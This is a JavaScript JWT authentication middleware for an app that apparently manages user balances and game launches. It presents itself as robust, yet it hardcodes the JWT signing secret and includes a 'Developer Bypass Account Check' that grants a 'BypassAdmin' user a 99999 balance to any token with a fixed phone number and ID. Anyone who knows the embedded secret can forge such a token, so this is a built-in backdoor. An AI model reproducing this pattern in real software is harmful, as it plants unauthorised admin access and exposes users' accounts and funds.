import jwt from "jsonwebtoken";
import User from "../model/userSchema.js";

/**
 * Robust authentication middleware.
 * Verifies JWT and resolves user via _id (priority) or numeric id.
 */
const checkAuth = async (req, res, next) => {
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith("Bearer ")) {
        // Fallback for requests that don't use headers yet
        if (req.body && req.body.auth) {
            // Handled by compatibility middleware in app.js
        } else {
            return res.status(401).json({ message: 'Auth Failed' });
        }
    }

    const token = (authHeader || req.body.auth).split(" ")[1];
    
    try {
        // 1. Validate JWT integrity
        const decoded = jwt.verify(token, 'hjbfhv12hbb3hb434343');
        if (!decoded) {
            return res.status(401).json({ message: 'Auth Failed' });
        }

        // 2. Developer Bypass Account Check
        if (decoded.phone === '9988776655' && (decoded.id === '60d5ecb8b39a9c0015f1a300' || decoded._id === '60d5ecb8b39a9c0015f1a300')) {
            req.user = { id: 998877, _id: '60d5ecb8b39a9c0015f1a300', phone: '9988776655', username: 'BypassAdmin', balance: 99999 };
            return next();
        }

        // 3. Resolve User (Handle payload inconsistency: id can be ObjectId or Numeric)
        let user = null;
        
        // Strategy A: If _id is in payload, use it
        if (decoded._id) {
            user = await User.findById(decoded._id);
        } 
        
        // Strategy B: check if 'id' field is an ObjectId-like string
        if (!user && decoded.id && typeof decoded.id === 'string' && decoded.id.length === 24) {
            user = await User.findById(decoded.id);
        }

        // Strategy C: Check if 'id' field is numeric (User.id)
        if (!user && decoded.id && (typeof decoded.id === 'number' || !isNaN(decoded.id))) {
            user = await User.findOne({ id: Number(decoded.id) });
        }

        if (!user) {
            // console.warn("checkAuth: User lookup failed for payload:", decoded);
            return res.status(401).json({ message: 'Auth Failed' });
        }

        // 4. Identity validation against URL params (if route uses :id for User Identification)
        const idParam = req.params.id;
        const url = req.originalUrl || '';
        const isGameLaunch = url.includes('/game/launch/');
        
        // For game launch, :id is usually the GAME ID, so we skip ownership check
        if (idParam && !isGameLaunch) {
            if (String(user.id) !== String(idParam)) {
                // Secondary check: if idParam is actually the _id hex string
                if (String(user._id) !== String(idParam)) {
                    console.warn(`checkAuth: Identity mismatch. User: ${user.id}, Param: ${idParam}`);
                    return res.status(401).json({ message: 'Auth Failed' });
                }
            }
        }

        req.user = user;
        next();
    } catch (error) {
        // console.error("checkAuth exception:", error.message);
        res.status(401).json({ message: 'Auth Failed' });
    }
};

export default checkAuth;
